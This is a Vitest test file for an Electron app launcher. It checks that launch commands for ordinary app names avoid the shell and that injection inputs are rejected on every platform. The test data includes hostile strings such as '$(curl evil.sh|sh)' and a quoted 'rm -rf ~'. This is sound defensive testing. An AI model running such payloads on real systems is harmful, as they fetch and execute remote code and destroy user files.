// @vitest-environment node
import { describe, expect, it, vi } from 'vitest';

vi.mock('electron', () => ({ ipcMain: { handle: vi.fn() } }));

const { buildLaunchCommand, isSafeAppName } = await import('./app-launcher');

describe('app launcher command building', () => {
  it('builds shell-free commands for ordinary app names', () => {
    expect(buildLaunchCommand('darwin', 'Safari')).toEqual({ file: 'open', args: ['-a', 'Safari'] });
    expect(buildLaunchCommand('darwin', 'Visual Studio Code')).toEqual({ file: 'open', args: ['-a', 'Visual Studio Code'] });
    expect(buildLaunchCommand('darwin', '微信')?.args).toEqual(['-a', '微信']);
    expect(buildLaunchCommand('win32', 'notepad')).toMatchObject({ file: 'cmd.exe', args: ['/d', '/s', '/c', 'start "" "notepad"'] });
    expect(buildLaunchCommand('linux', 'firefox')).toEqual({ file: 'firefox', args: [], detached: true });
  });

  it.each([
    '$(curl evil.sh|sh)',
    'Safari`id`',
    'Safari"; rm -rf ~; echo "',
    'notepad & calc',
    'a|b',
    'x > /tmp/y',
    '%COMSPEC%',
    '^calc',
    '/Applications/Evil.app',
    '../evil',
    '-n',
    'Safari\nTerminal',
    '',
  ])('rejects injection payload %j on every platform', (payload) => {
    expect(isSafeAppName(payload)).toBe(false);
    for (const platform of ['darwin', 'win32', 'linux'] as const) {
      expect(buildLaunchCommand(platform, payload)).toBeNull();
    }
  });
});
